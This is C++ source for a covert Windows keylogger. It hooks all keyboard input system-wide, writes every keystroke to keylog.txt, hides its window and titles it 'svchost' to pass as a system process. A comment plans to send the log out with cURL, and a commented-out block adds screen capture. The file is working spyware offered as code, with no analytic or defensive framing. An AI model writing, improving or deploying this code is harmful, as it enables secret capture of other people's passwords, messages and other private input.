#include <fstream>
#include <iostream>
#include <string>
#include <windows.h>

#define OUTFILE_NAME "Log.txt" //Will be solved via cURL with buffer
#define CLASSNAME "winkey"
#define WINDOWTITLE	"svchost"

char windir[MAX_PATH + 1];
HHOOK kbdhook;
bool running;

/**
* \brief Called by Windows automagically every time a key is pressed (regardless
* of who has focus)
*/
__declspec(dllexport) LRESULT CALLBACK handlekeys(int code, WPARAM wp, LPARAM lp)
{
	if (code == HC_ACTION && (wp == WM_SYSKEYDOWN || wp == WM_KEYDOWN)) {
		static bool capslock = false;
		static bool shift = false;
		char tmp[0xFF] = { 0 };
		std::string str;
		DWORD msg = 1;
		KBDLLHOOKSTRUCT st_hook = *((KBDLLHOOKSTRUCT*)lp);
		bool printable;

		msg += (st_hook.scanCode << 16);
		msg += (st_hook.flags << 24);
		GetKeyNameText(msg, tmp, 0xFF);
		str = std::string(tmp);

		printable = (str.length() <= 1) ? true : false; //if char is p.g 'E' -> printable, Ctrl -> not printable

		if (!printable) {
			if (str == "CAPSLOCK" || str == "Caps Lock")
				capslock = !capslock;
			else if (str == "SHIFT" || str == "Shift")
				shift = true;

			if (str == "ENTER" || str == "Enter") {
				str = "\n";
				printable = true;
			}
			else if (str == "SPACE" || str == "Space") {
				str = " ";
				printable = true;
			}
			else if (str == "TAB" || str == "Tab") {
				str = "\t";
				printable = true;
			}
			else {
				str = ("[" + str + "]");
			}
		}

		if (printable) {
			if (shift == capslock) { /* Lowercase */
				for (size_t i = 0; i < str.length(); ++i)
					str[i] = tolower(str[i]);
			}
			else { /* Uppercase */
				for (size_t i = 0; i < str.length(); ++i) {
					if (str[i] >= 'A' && str[i] <= 'Z') {
						str[i] = toupper(str[i]);
					}
				}
			}

			shift = false;
		}

		std::ofstream logfile;
		logfile.open("keylog.txt", std::fstream::app);
		logfile << str;
		logfile.close();
	}

	return CallNextHookEx(kbdhook, code, wp, lp);
}


/**
* \brief Called by DispatchMessage() to handle messages
* \param hwnd	Window handle
* \param msg	Message to handle
* \param wp
* \param lp
* \return 0 on success
*/
LRESULT CALLBACK windowprocedure(HWND hwnd, UINT msg, WPARAM wp, LPARAM lp)
{
	switch (msg) {
	case WM_CLOSE: case WM_DESTROY:
		running = false;
		break;
	default:
		/* Call default message handler */
		return DefWindowProc(hwnd, msg, wp, lp);
	}

	return 0;
}

int WINAPI WinMain(HINSTANCE thisinstance, HINSTANCE previnstance,
	LPSTR cmdline, int ncmdshow)
{
	/*
	* Set up window
	*/
	HWND		hwnd;
	HWND		fgwindow = GetForegroundWindow(); /* Current foreground window */
	MSG		msg;
	WNDCLASSEX	windowclass;
	HINSTANCE	modulehandle;

	windowclass.hInstance = thisinstance;
	windowclass.lpszClassName = CLASSNAME;
	windowclass.lpfnWndProc = windowprocedure;
	windowclass.style = CS_DBLCLKS;
	windowclass.cbSize = sizeof(WNDCLASSEX);
	windowclass.hIcon = LoadIcon(NULL, IDI_APPLICATION);
	windowclass.hIconSm = LoadIcon(NULL, IDI_APPLICATION);
	windowclass.hCursor = LoadCursor(NULL, IDC_ARROW);
	windowclass.lpszMenuName = NULL;
	windowclass.cbClsExtra = 0;
	windowclass.cbWndExtra = 0;
	windowclass.hbrBackground = (HBRUSH)COLOR_BACKGROUND;

	if (!(RegisterClassEx(&windowclass)))
		return 1;

	hwnd = CreateWindowEx(NULL, CLASSNAME, WINDOWTITLE, WS_OVERLAPPEDWINDOW,
		CW_USEDEFAULT, CW_USEDEFAULT, 640, 480, HWND_DESKTOP, NULL,
		thisinstance, NULL);
	if (!(hwnd))
		return 1;

	//ShowWindow(hwnd, SW_SHOW);
	ShowWindow(hwnd, SW_HIDE);
	UpdateWindow(hwnd);
	SetForegroundWindow(fgwindow); /* Give focus to the previous fg window */

								   /*
								   * Hook keyboard input so we get it too
								   */
	modulehandle = GetModuleHandle(NULL);
	kbdhook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)handlekeys, modulehandle, NULL);

	running = true;

	GetWindowsDirectory((LPSTR)windir, MAX_PATH);

	/*
	* Main loop
	*/
	while (running) {
		/*
		* Get messages, dispatch to window procedure
		*/
		if (!GetMessage(&msg, NULL, 0, 0))
			running = false; 
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	return 0;
}
/*
void saveBitmap(char* path, void* lpBits, int h, int w)
{
	FILE* p_file = fopen(path, "wb");
	if (p_file == NULL)
		return;
	BITMAPINFOHEADER BMIH;
	BMIH.biSize = sizeof(BITMAPINFOHEADER);
	BMIH.biWidth = w;
	BMIH.biHeight = h;
	BMIH.biPlanes = 1;
	BMIH.biBitCount = 24;
	BMIH.biCompression = BI_RGB;
	BMIH.biSizeImage = w * h * 3;

	BITMAPFILEHEADER bmfh;
	int nBitsOffset = sizeof(BITMAPFILEHEADER) + BMIH.biSize;
	LONG lImageSize = BMIH.biSizeImage;
	LONG lFileSize = nBitsOffset + lImageSize;
	bmfh.bfType = 'B' + ('M' << 8);
	bmfh.bfOffBits = nBitsOffset;
	bmfh.bfSize = lFileSize;
	bmfh.bfReserved1 = bmfh.bfReserved2 = 0;

	UINT writtenFileHeaderSize = fwrite(&bmfh, 1, sizeof(BITMAPINFOHEADER), p_file);
	UINT nWrittenInfoHeaderSize = fwrite(&BMIH, 1, sizeof(BITMAPINFOHEADER), p_file);

	UINT nWrittenDIBDataSize = fwrite(lpBits, 1, lImageSize, p_file);
	fclose(p_file);

	return;
}

HBITMAP takeScreen()
{
	HDC screenDC = GetDC(NULL);
	HDC memoryDC = CreateCompatibleDC(screenDC);

	int height = GetSystemMetrics(SM_CYSCREEN);
	int width = GetSystemMetrics(SM_CXSCREEN);

	HBITMAP BitMap = CreateCompatibleBitmap(screenDC, width, height);

	HBITMAP OldBitMap = (HBITMAP)SelectObject(memoryDC, BitMap);

	BitBlt(memoryDC, 0, 0, width, height, screenDC, 0, 0, SRCCOPY);
	BitMap = (HBITMAP)SelectObject(memoryDC, OldBitMap);

	DeleteDC(memoryDC);
	DeleteDC(screenDC);
	saveBitmap("tmp/", BitMap, height, width);
}
*/